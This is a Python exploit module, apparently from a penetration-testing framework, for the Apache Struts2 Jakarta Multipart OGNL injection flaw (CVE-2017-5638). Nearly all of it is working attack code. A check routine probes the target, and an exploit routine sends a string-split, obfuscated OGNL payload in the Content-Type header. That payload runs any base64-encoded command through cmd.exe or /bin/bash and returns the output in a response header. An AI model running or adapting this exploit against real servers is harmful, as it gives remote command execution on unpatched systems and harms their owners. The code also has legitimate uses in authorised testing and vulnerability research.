import os,sys,time,cgi,base64,random,re
from lib.common import http
from urllib import quote

class Module:
    def __init__(self,Main):
        self.main=Main
        self.info={
            'Name':'Apache Struts Jakarta Multipart Parser OGNL Injection',
            'Author':'sushan',
            'Description':'The Jakarta Multipart parser in Apache Struts2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts,which allows remote attackers to execute arbitrary commands via a crafted Content-Type,Content-Disposition,or Content-Length HTTP header',
            'Comments':'http://www.cvedetails.com/cve/CVE-2017-5638'
        }
        self.options={
            'RHOST':{
                'Description':'The target address',
                'Required':True,
                'Value':''
            },
            'RPORT':{
                'Description':'The target port (TCP)',
                'Required':True,
                'Value':'8080'
            },
            'URIPATH':{
                'Description':'Path to action',
                'Required':True,
                'Value':'/2.3.20/showcase.action'
            },
            'URL':{
                'Description':'The URL to use for this exploit',
                'Required':False,
                'Value':'/'
            },
            'OS':{
                'Description':'Target Platform OS',
                'Required':False,
                'Value':'windows'
            }
        }

    def payload(self,cmd):
        x='''\
("multipart/form-data").\
(#x=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#x):(\
(#xx=#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.Act'+'ionCont'+'ext.co'+'nta'+'iner'].getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
(#xx.getExcludedPackageNames().clear()).(#xx.getExcludedClasses().clear()).(#context.setMemberAccess(#x)))).\
(#x=(@java.lang.System@getProperty("o"+"s.na"+"me").toLowerCase().contains("wi"+"n"))).\
(#xx=@org.apache.struts2.ServletActionContext@getRequest().getHeader('x-ids')).\
(#xx=new java.lang.String((new sun.misc.BASE64Decoder()).decodeBuffer(#xx))).\
(#x=new java.lang.ProcessBuilder((#x?{"cm"+"d.e"+"xe","/"+"c",#xx}:{"/bi"+"n/b"+"as"+"h","-"+"c",#xx}))).(#x.redirectErrorStream(true)).\
(#x=@org.apache.commons.io.IOUtils@toString(#x.start().getInputStream())).\
(#x=(new sun.misc.BASE64Encoder()).encodeBuffer(#x.getBytes("utf-8")).replaceAll("\\r","").replaceAll("\\n","")).\
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].addHeader('x-ids',#x))\
'''
        return '%{'+x+'}'

    def check(self):
        req=http.Http(self.options)
        a='''\
("multipart/form-data").\
(#x=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#x):(\
(#xx=#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.Act'+'ionCont'+'ext.co'+'nta'+'iner'].getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
(#xx.getExcludedPackageNames().clear()).(#xx.getExcludedClasses().clear()).(#context.setMemberAccess(#x)))).\
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].addHeader('x-ids','x123#'))\
'''
        xx=req.post({'Content-Type':'%{'+a+'}'},random.choice('abcdefwx')+'1=123456')
        try:
            if xx!=None and xx.status_code==200 and xx.headers['x-ids']=='x123#':
                return True
            return False
        except:
            return False

    def exploit(self,cmd):
        req=http.Http(self.options)
        xx=req.post({'Content-Type':self.payload(cmd),'x-ids':base64.b64encode(cmd)},random.choice('abcdefwx')+'1=123456')
        if xx!=None and xx.status_code==200:
            try:
                x=base64.b64decode(xx.headers['x-ids'])
                return '[*] %s' % (x)
            except:
                return xx.text
        return '[!] execute cmd error.'
